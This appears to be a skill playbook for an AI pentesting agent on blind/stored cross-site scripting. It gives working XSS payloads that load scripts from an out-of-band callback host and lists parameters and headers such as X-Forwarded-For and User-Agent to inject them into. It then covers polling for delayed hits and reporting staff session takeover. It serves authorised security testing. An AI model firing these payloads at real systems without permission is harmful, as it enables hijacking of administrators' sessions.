---
name: playbook-blind-xss
description: Orchestrate blind/stored XSS across every parameter AND injectable header with Burp Collaborator, then poll for delayed out-of-band hits (fires when an admin views the stored content)
---

# Playbook: Blind / Stored XSS (OOB)

Blind XSS is different from reflected: the payload is STORED and executes later,
in a privileged viewer's browser (support agent, admin panel). The proof is an
out-of-band callback that arrives minutes-to-hours after injection — so a
one-shot poll misses it. This orchestrates existing tools; there is no
single-call tool because the confirmation is deferred.

## 1. Callback (Rule 9a — never fabricate)

```
generate_collaborator_pool(count=25)      # Burp Pro
```
Community / no Collaborator → ASK the operator for a callback (interact.sh /
webhook.site). Never hardcode a domain.

## 2. Payloads (script that beacons on render)

Substitute `COLLAB` with a pool payload. Rotate a few shapes so one bypasses:

```
"><script src=//COLLAB></script>
"><img src=x onerror="import('//COLLAB')">
'><svg onload="fetch('//COLLAB')">
javascript:import('//COLLAB')//
</textarea><script src=//COLLAB></script>
```

Encode a per-injection marker into the subdomain (`p1.COLLAB`, `hdr-xff.COLLAB`)
so a later hit tells you EXACTLY which field fired — this is the whole point of
the pool.

## 3. Inject everywhere — params AND headers

- **Parameters:** every stored-content sink — profile name, comment, support
  ticket, address, filename, user-agent-logged fields. Use `run_dalfox` blind
  mode across discovered params, or `concurrent_requests` with one pool payload
  per param.
- **Headers (high-yield, often unmonitored):** inject a distinct pool payload
  into each of `X-Forwarded-For`, `Referer`, `User-Agent`, `X-Forwarded-Host`,
  `True-Client-IP`, `X-Api-Version`, `From`. Admin dashboards and log viewers
  render these. `auto_collaborator_test(url, parameter, injection_point='header')`
  injects+sends per header; or `concurrent_requests` with a header set.
- Record which marker went to which (field, url) — the deferred hit is only
  useful if you can map it back.

## 4. Poll — deferred, repeatedly

```
get_collaborator_interactions()
```
Poll again after minutes/hours, not once. A DNS/HTTP hit to `hdr-xff.COLLAB`
from a NON-target IP (the victim's browser/proxy) is the confirmation. Same-IP
immediate hits are usually SSRF/self, not blind XSS — distinguish by timing +
source IP + whether a `<script src>` actually loaded (HTTP GET for the script
path, not just DNS).

## 5. Report

Blind XSS is HIGH when it fires in a privileged context (admin/support panel):
session theft / ATO of staff. Evidence = the injection request (marker → field)
+ the Collaborator interaction (source IP, timestamp, script-path GET) + the
context it executed in. Store the marker→field map in the finding so the writeup
cites the exact sink. One confirmed staff-context blind XSS ≫ ten reflected.
